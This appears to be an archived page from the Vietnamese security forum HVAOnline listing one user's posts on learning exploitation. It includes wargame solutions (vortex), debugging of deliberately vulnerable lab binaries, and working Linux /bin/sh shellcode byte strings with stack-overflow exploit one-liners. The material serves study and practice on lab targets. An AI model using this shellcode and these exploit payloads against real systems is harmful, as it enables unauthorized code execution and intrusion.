<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by Cognac, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by Cognac - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/176833.html" name="top" class="maintitle" id="top">Messages posted by: Cognac</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/176833.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/176833.html">Profile for Cognac</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/176833.html">Messages posted by Cognac</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">0</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25730.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25730/156019.html#156019,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">StarGhost wrote:</cite><br>
<blockquote>Tớ là newbie nên còn đang mày mò nghịch ngợm. Có phải source đại khái là thế này không?<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>int doit&#40;char *str&#41;
{
strcpy&#40;&#40;char *&#41;&#40;&#40;int&#41;&str - 16&#41;, str&#41;;
printf&#40;"%s\n", &#40;char *&#41;&#40;&#40;int&#41;&str - 16&#41;&#41;;
return 0;
}
int main&#40;int argc, char *argv&#91;&#93;&#41;
{
if &#40;strlen&#40;argv&#91;1&#93;&#41; &gt; 8&#41;
*&#40;argv&#91;1&#93; + 8&#41; = 0;
doit&#40;argv&#91;1&#93;&#41;;
return 0;
}</pre>
</div><br/> &nbsp;
</blockquote><br/> @StarGhost: Cậu reverse tương đối chuẩn, tuy nhiên theo mình thì ko có return 0 ở hàm doit.<br/> Anyway, cậu đã reverse code được rồi thì chạy dùm tớ cái này và giải thích hộ tớ<br/> Máy tớ là<br/> <blockquote>$ gdb ./exploitme1<br/> GNU gdb 6.6-debian<br/> Copyright (C) 2006 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i486-linux-gnu"...<br/> Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".<br/> (gdb) <font color='orange'>run `python -c 'print "AAAA" + "BBBB" + "C"*497'`</font><br/> Starting program: /home/Cognac/exploitme1 `python -c 'print "AAAA" + "BBBB" + "C"*497'`<br/> AAAABBBB<br/><br/> Program received signal SIGSEGV, Segmentation fault.<br/> <font color='red'>0x42424242</font> in ?? ()&nbsp;
</blockquote><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25580.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25580/155139.html#155139,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">@lamer: Có lẽ ý tưởng về encode và decode gần giống như vầy:<br/> (PHP hình như ko support các function liên quan đến charset US-ASCII, mình demo tạm encode & decode qua lại giữa UTF-8 và UTF-16)<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
function utf16&#40;$str&#41;
{
$utf8 = utf8_encode&#40;$str&#41;;
if&#40;function_exists&#40;'mb_convert_encoding'&#41;&#41;
{
return mb_convert_encoding&#40;$utf8, 'UTF-16', 'UTF-8'&#41;;
} else
{
return $str;
}
}
echo "encode ..."."&lt;br&gt;";
echo utf16&#40;$_GET&#91;'str'&#93;&#41;;
echo "&lt;br&gt;";
echo "decode ..."."&lt;br&gt;";
echo mb_convert_encoding&#40;utf16&#40;$_GET&#91;'str'&#93;&#41;, 'UTF-8', 'UTF-16'&#41;
?&gt;</pre>
</div><br/> Ok, chạy thử<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://localhost/test.php?str=aaa
--&gt;
encode ...
a�a�a
decode ...
aaa</pre>
</div><br/> Kỹ thuật này liên quan đến lĩnh vực Masking Malware chăng? Nhờ bác lamer và các bạn gợi ý <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23615.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23615/154495.html#154495,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Nó output ra dạng tuple nên truy xuất giá trị của nó để cộng dồn 4 số lại phải dùng kiểu list để lấy giá trị. Công nhận là hơi khó chịu (có lẽ do mới vọc python)<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>import socket
import struct
from struct import *
sock = socket.socket&#40;&#41;
sock.connect&#40;&#40;'vortex.labs.pulltheplug.org', 5842&#41;&#41;
len_int = 4
i = 0
sum = 0
while &#40;i != 4&#41;:
num = unpack&#40;'&lt;I',sock.recv&#40;len_int&#41;&#41;
print num&#91;0&#93;
sum += num&#91;0&#93;
i += 1
print sum
sock.send&#40;pack&#40;'&lt;I',sum&#41;&#41;
print sock.recv&#40;1024&#41;
sock.close&#40;&#41;</pre>
</div><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>wargame$ python test1.py
83808278
183050462
24982680
1273023711
1564865131
Username: vortex1 Password: **********</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23615.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23615/154288.html#154288,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">@rickbb:<br/> bồ thử thêm 2 dòng:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&gt;&gt;&gt; from struct import *
&gt;&gt;&gt;print unpack&#40;'I',in_data&#41;</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25139.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25139/152478.html#152478,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">Mr.Khoai wrote:</cite><br>
<blockquote>anh mrro,<br/><br/> "Bài" này không giới hạn độ dài tối đa ở 30 bytes. Cái khoai đang tìm là một shellcode thật nhỏ. Nhỏ nhất là bao nhiêu thì khoai không biết. Nhưng khoai đã mò được một cái chỉ với 16 bytes, spawn /bin/sh và không bị la lên là "malicious code detected"<br/><br/> Cognac,<br/><br/> <font color='orange'>Ủa, cứ tưởng code asm là của bồ viết chứ, sao lại bảo khoai chuyển từ shellcode qua assembly? </font><br/><br/> to all,<br/><br/> Bài này làm chơi cho vui. Đừng vướng vào lối mòn khi suy nghĩ. Nghĩ thoáng một chút sẽ tìm được một con shellcode hiệu quả mà kích thước lại nhỏ<br/><br/> khoai&nbsp;
</blockquote><br/> nói chơi một câu mà khó chịu vậy bồ <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom">. Thực tế spawshell trong trường hợp này thì chắc hẳn là bạn khai thác kiểu "local exploit" chứ ko phải "remote exploit" nên thay vì chúng ta mất 10 byte để push chuỗi /bin/sh, thì cất chuỗi đó trong biến môi trường rồi push vào, tiết kiệm được 5 byte. Bồ có chịu kiểu này ko? <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25139.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25139/152262.html#152262,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">@MrKhoai: Bạn chuyển đoạn shellcode của mình sang assembly dùm, mình sẽ nhờ mọi người giải thích <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25139.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25139/152201.html#152201,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Đáp án này có vẻ khả thi hơn<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;sh3llc0d3</pre>
</div><br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>./testshell sh3llc0d3
your shellcode is less than 30 bytes! 10 bonus points
$</pre>
</div><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25139.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25139/152189.html#152189,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Anh Khoai chạy thử :<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>python -c 'print "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' &gt;input</pre>
</div><br/> rồi chạy<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>./testshell input</pre>
</div><br/> PS: strlen(shellcode &gt;30) && strlen(shellcode &lt;50) thì ko được point nào ?? <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24349.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24349/149739.html#149739,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">mrro wrote:</cite><br>
<blockquote>@Cognac: lúc đó sẽ có hai trường hợp:<br/><br/> - có SSP <span class="link"> http://www.trl.ibm.com/projects/security/ssp/</span>) hay không? nếu có SSP thì đối với đoạn mã này mặc dù bị lỗi nhưng sẽ kô thể khai thác được, chỉ có làm cho chương trình nó crash thôi.<br/><br/> - không có SSP (compile với option <b>-fno-stack-protector</b>), lúc này mã dissasembly của đoạn chương trình trên sẽ như sau:<br/><br/> <blockquote>(gdb) disas main<br/> Dump of assembler code for function main:<br/> 0x080483a4 &lt;main+0&gt;: lea 0x4(%esp),%ecx<br/> 0x080483a8 &lt;main+4&gt;: and $0xfffffff0,%esp<br/> 0x080483ab &lt;main+7&gt;: pushl -0x4(%ecx)<br/> 0x080483ae &lt;main+10&gt;: push %ebp<br/> 0x080483af &lt;main+11&gt;: mov %esp,%ebp<br/> 0x080483b1 &lt;main+13&gt;: push %ecx<br/> 0x080483b2 &lt;main+14&gt;: sub $0x24,%esp<br/> 0x080483b5 &lt;main+17&gt;: movl $0x80484b0,(%esp)<br/> 0x080483bc &lt;main+24&gt;: call 0x804830c &lt;printf@plt&gt;<br/> 0x080483c1 &lt;main+29&gt;: lea -0xc(%ebp),%eax<br/> 0x080483c4 &lt;main+32&gt;: mov %eax,(%esp)<br/> 0x080483c7 &lt;main+35&gt;: call 0x80482ec &lt;gets@plt&gt;<br/> 0x080483cc &lt;main+40&gt;: lea -0xc(%ebp),%eax<br/> 0x080483cf &lt;main+43&gt;: mov %eax,0x4(%esp)<br/> 0x080483d3 &lt;main+47&gt;: movl $0x80484c4,(%esp)<br/> 0x080483da &lt;main+54&gt;: call 0x804830c &lt;printf@plt&gt;<br/> 0x080483df &lt;main+59&gt;: mov $0x0,%eax<br/> 0x080483e4 &lt;main+64&gt;: add $0x24,%esp<br/> 0x080483e7 &lt;main+67&gt;: pop %ecx<br/> 0x080483e8 &lt;main+68&gt;: pop %ebp<br/> <font color='yellow'>0x080483e9 &lt;main+69&gt;: lea -0x4(%ecx),%esp</font><br/> 0x080483ec &lt;main+72&gt;: ret<br/> End of assembler dump.&nbsp;
</blockquote><br/><br/><br/> Hơi khó exploit một chút, nhưng vẫn có thể exploit được. Bồ thử tìm hiểu cách exploit xem, gợi ý: chú ý vào <b>ecx</b>.<br/><br/> --m&nbsp;
</blockquote><br/> Đoạn tô vàng có nghĩa là lấy thanh ghi [ecx] -4, rồi move vào esp và ret???<br/> Vậy thì tui sẽ viết đè lên ecx với địa chị ($ebp+4), sau đó overwrite tiếp lên ebp địa chỉ của shellcode:<br/> mrro thử chạy<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>python -c 'print "A" * 8 + "\xb2\x83\x04\x08" + "\xAA\xBB\XCC\XDD"' | ./vul</pre>
</div><br/> Trong đó \xAA\xBB\XCC\XDD là địa chỉ biến môi trường chứa shellcode chẳng hạn.<br/> Mô hình stack trong trường hợp này:<br/><br/> high mem --------------------------------------------------------&gt; low mem<br/> [*argv] [argc ] [eip ] [ %ecx-4 ] [ebp ] [ecx ] [buf[8] ]<br/><br/><br/><br/> PS: Tui ko nhớ cách input dạng này trong gdb khi run, bác mrro chỉ tui được ko?</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/13767.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/13767/149535.html#149535,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="link"> http://360.yahoo.com/conmale2000</span></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24649.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24649/149072.html#149072,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">nhân thêm (x+a) vào phương trình bậc 3, rồi giải phương trình bậc 4 tổng quát = phương pháp Abel <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24349.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24349/149069.html#149069,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">@Tal: Bạn có thể giải thích tại sao khi compile, bạn cho thằng -mpreferred-stack-boundary=2 được ko? <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"><br/> Cái này có lẽ liên quan đến memory allocate của gcc, dung lượng stack frame đc gcc cấp sẽ thay đổi phụ thuộc vào thuộc tính này ?? <img src="/hvaonline/images/smilies/e746f170e2a60a973f6f1b2abdbfa5a7.gif" border="0" alt="smilie" align="absbottom"><br/> Trong trường hợp này là<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>0x080483a7 &lt;main+3&gt;: sub $0x10,%esp</pre>
</div><br/> @TaL, mrro: Bạn nói rõ hơn về stack layout của gcc 4.2.x được ko? <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom">. Cụ thể là nếu compile đoạn mã này bằng gcc 4.2 và preferred-stack-boundary=4 thì sẽ exploit thế nào?</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
